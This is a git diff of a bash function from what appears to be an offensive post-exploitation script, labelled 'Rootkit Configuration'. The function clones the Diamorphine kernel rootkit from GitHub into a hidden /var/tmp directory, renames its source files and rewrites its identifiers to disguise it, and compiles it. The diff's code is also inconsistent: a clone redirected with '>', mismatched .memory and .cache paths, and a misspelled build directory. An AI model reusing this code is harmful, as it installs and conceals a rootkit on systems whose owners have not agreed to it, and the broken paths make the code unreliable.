@@ -123,11 +123,11 @@ bashrc() {
 configDiamorphine() {
     echo -e "\033[0;32m[+] - Rootkit Configuration"
     mkdir -p /var/tmp/.memory
-    git clone https://github.com/m0nad/Diamorphine /var/tmp/.memory
+    git clone https://github.com/m0nad/Diamorphine > /var/tmp/.memory
     mv /var/tmp/.memory/diamorphine.c /var/tmp/.memory/root.c 
     mv /var/tmp/.memory/diamorphine.h /var/tmp/.memory/root.h
-    sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.cache/rk.h
-    sed -i 's/diamorphine/dynasty/g' /var/tmp/.cache/rk.h
+    sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.cache/root.h
+    sed -i 's/diamorphine/dynasty/g' /var/tmp/.cache/root.h
     make -C /var/tmp/.memeory
     sed -i 's/diamorphine.h/root.h/g' /var/tmp/.cache/root.c
     sed -i 's/diamorphine_init/root_init/g' /var/tmp/.cache/root.c 
